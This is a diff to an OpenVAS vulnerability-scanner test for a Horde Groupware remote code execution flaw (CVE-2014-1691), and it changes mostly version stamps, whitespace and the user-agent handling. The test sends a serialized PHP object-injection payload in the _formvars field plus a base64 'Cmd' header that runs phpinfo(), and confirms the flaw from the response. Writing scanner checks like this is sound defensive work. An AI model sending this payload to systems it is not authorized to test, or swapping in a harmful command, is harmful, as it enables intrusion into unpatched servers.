@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_horde_65200.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_horde_65200.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # Horde '_formvars' Form Input Remote Code Execution Vulnerability
 #
@@ -27,14 +27,14 @@
 
 CPE = "cpe:/a:horde:horde_groupware";
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103926");
   script_bugtraq_id(65200);
   script_cve_id("CVE-2014-1691");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11222 $");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
@@ -43,7 +43,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65200");
   script_xref(name:"URL", value:"http://www.horde.org");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-03-21 11:45:12 +0100 (Fri, 21 Mar 2014)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -69,12 +69,11 @@ caused by the improper validation of _formvars form input.");
   script_tag(name:"affected", value:"Horde 3.1.x through versions 5.1.1 are vulnerable, other versions may
 also be affected.");
 
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
-
 
 if (!port = get_app_port(cpe: CPE))
   exit( 0 );
@@ -82,6 +81,7 @@ if (!port = get_app_port(cpe: CPE))
 if (!dir = get_app_location( cpe:CPE, port:port))
   exit( 0 );
 
+useragent = get_http_user_agent();
 host = http_host_name(port:port);
 
 formwars = '_formvars=O%3a34%3a%22Horde_Kolab_Server_Decorator_Clean%22%3a2%3a%7bs%3a43%3a%22%00Horde_Kolab_Server_Decorator_Clean%00'       +
@@ -97,13 +97,12 @@ len = strlen( formwars );
 
 req = 'POST ' + dir + '/login.php HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n' +
-      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT +'\r\n' +
+      'User-Agent: ' + useragent + '\r\n' +
       'Cmd: cGhwaW5mbygpO2RpZTsK\r\n' + # phpinfo();die;
       'Content-Type: application/x-www-form-urlencoded\r\n' +
       'Content-Length: ' + len + '\r\n' +
       '\r\n' +
       formwars;
-
 buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
 
 if( "<title>phpinfo()" >< buf )
